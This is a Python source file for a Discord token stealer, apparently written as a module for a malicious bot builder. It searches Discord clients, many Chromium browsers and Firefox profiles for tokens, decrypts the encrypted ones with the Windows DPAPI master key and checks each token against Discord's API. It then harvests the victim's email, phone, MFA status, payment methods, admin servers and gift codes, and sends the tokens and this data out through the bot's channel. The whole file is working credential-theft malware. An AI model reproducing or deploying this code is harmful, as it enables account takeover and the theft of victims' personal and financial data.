import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from discord import Embed
from win32crypt import CryptUnprotectData

def grab_discord_tokens():
    """Main function to extract Discord tokens"""
    base_url = "https://discord.com/api/v9/users/@me"
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
    tokens = []
    uids = []

    def validate_token(token: str) -> bool:
        try:
            r = requests.get(base_url, headers={'Authorization': token}, timeout=10)
            return r.status_code == 200
        except:
            return False
    
    def decrypt_val(buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return ""
    
    def get_master_key(path: str) -> bytes:
        try:
            if not os.path.exists(path): 
                return None
            with open(path, "r", encoding="utf-8") as f: 
                c = f.read()
            if 'os_crypt' not in c:
                return None
                
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    paths = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\ Local Storage\\leveldb\\',
        'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
    }

    for name, path in paths.items():
        if not os.path.exists(path): 
            continue
            
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(roaming + f'\\{_discord}\\Local State'): 
                continue
                
            master_key = get_master_key(roaming + f'\\{_discord}\\Local State')
            if not master_key:
                continue
                
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: 
                    continue
                    
                try:
                    with open(f'{path}\\{file_name}', 'r', errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                                
                            for y in re.findall(regexp_enc, line):
                                try:
                                    token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                    if token and validate_token(token):
                                        uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
                                        if uid and uid not in uids:
                                            tokens.append(token)
                                            uids.append(uid)
                                except:
                                    continue
                except:
                    continue
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: 
                    continue
                    
                try:
                    with open(f'{path}\\{file_name}', 'r', errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                                
                            for token in re.findall(regexp, line):
                                if validate_token(token):
                                    uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
                                    if uid and uid not in uids:
                                        tokens.append(token)
                                        uids.append(uid)
                except:
                    continue

    # Check Firefox profiles
    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith('.sqlite'):
                    continue
                try:
                    with open(f'{path}\\{_file}', 'r', errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                            for token in re.findall(regexp, line):
                                if validate_token(token):
                                    uid = requests.get(base_url, headers={'Authorization': token}).json().get('id')
                                    if uid and uid not in uids:
                                        tokens.append(token)
                                        uids.append(uid)
                except:
                    continue

    return tokens

def get_token_info(token):
    """Get detailed user information from token"""
    try:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
        
        username = user.get('username', '') + '#' + user.get('discriminator', '')
        user_id = user.get('id', '')
        email = user.get('email')
        phone = user.get('phone')
        mfa = user.get('mfa_enabled', False)
        
        # Get avatar URL
        avatar_hash = user.get('avatar')
        if avatar_hash:
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.gif"
            try:
                if requests.get(avatar).status_code != 200:
                    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
            except:
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
        else:
            avatar = None
            
        # Get nitro status
        premium_type = user.get('premium_type', 0)
        if premium_type == 1:
            nitro = 'Nitro Classic'
        elif premium_type == 2:
            nitro = 'Nitro'
        elif premium_type == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'
            
        # Get payment methods
        payment_methods = []
        if billing:
            for method in billing:
                if method.get('type') == 1:
                    payment_methods.append('Credit Card')
                elif method.get('type') == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
        
        # Get HQ guilds
        hq_guilds = []
        if guilds:
            for guild in guilds:
                admin = int(guild.get("permissions", 0)) & 0x8 != 0
                if admin and guild.get('approximate_member_count', 0) >= 100:
                    owner = '✅' if guild.get('owner', False) else '❌'
                    try:
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0: 
                            invite = 'https://discord.gg/' + invites[0]['code']
                        else: 
                            invite = "https://youtu.be/dQw4w9WgXcQ"
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        if len('\n'.join(hq_guilds)) + len(data) >= 1024: 
                            break
                        hq_guilds.append(data)
                    except:
                        continue
        
        # Get gift codes
        codes = []
        if gift_codes:
            for code in gift_codes:
                name = code.get('promotion', {}).get('outbound_title', 'Unknown')
                code_str = code.get('code', '')
                data = f":gift: `{name}`\n:ticket: `{code_str}`"
                if len('\n\n'.join(codes)) + len(data) >= 1024: 
                    break
                codes.append(data)
                    
        return {
            'username': username,
            'user_id': user_id,
            'token': token,
            'email': email,
            'phone': phone,
            'mfa': mfa,
            'avatar': avatar,
            'nitro': nitro,
            'payment_methods': ', '.join(payment_methods) if payment_methods else 'None',
            'hq_guilds': '\n'.join(hq_guilds) if hq_guilds else None,
            'gift_codes': '\n\n'.join(codes) if codes else None
        }
    except:
        return None

# ========== MAIN CODE THAT GETS INSERTED INTO THE BOT COMMAND ==========

# Remove all the async wrapper functions - the builder will handle the command structure
# This code gets inserted directly into the bot command function

# Start token grabbing process
await ctx.send("🔍 Starting Discord token extraction...")

tokens = grab_discord_tokens()

if not tokens:
    await ctx.send("❌ No valid Discord tokens found.")
else:
    final_results = []
    
    for token in tokens:
        token_info = get_token_info(token)
        
        if token_info:
            # Create embed for each token
            embed = Embed(title=f"{token_info['username']} ({token_info['user_id']})", color=0x0084ff)
            
            if token_info['avatar']:
                embed.set_thumbnail(url=token_info['avatar'])
            
            embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
            embed.add_field(name="💎 Nitro:", value=f"{token_info['nitro']}", inline=True)
            embed.add_field(name="💳 Billing:", value=f"{token_info['payment_methods']}", inline=True)
            embed.add_field(name="🔒 MFA:", value=f"{token_info['mfa']}", inline=True)
            embed.add_field(name="📧 Email:", value=f"{token_info['email'] if token_info['email'] else 'None'}", inline=True)
            embed.add_field(name="📳 Phone:", value=f"{token_info['phone'] if token_info['phone'] else 'None'}", inline=True)
            
            if token_info['hq_guilds']:
                embed.add_field(name="🏰 HQ Guilds:", value=token_info['hq_guilds'], inline=False)
            
            if token_info['gift_codes']:
                embed.add_field(name="\u200b\n🎁 Gift Codes:", value=token_info['gift_codes'], inline=False)
            
            final_results.append(embed)
        else:
            # Fallback for tokens without detailed info
            embed = Embed(title="Unknown Token", color=0xff0000)
            embed.add_field(name="Token", value=f"```{token}```", inline=False)
            final_results.append(embed)
    
    # Send all results
    for result in final_results:
        await ctx.send(embed=result)
    
    await ctx.send(f"✅ Token extraction completed! Found {len(tokens)} valid tokens.")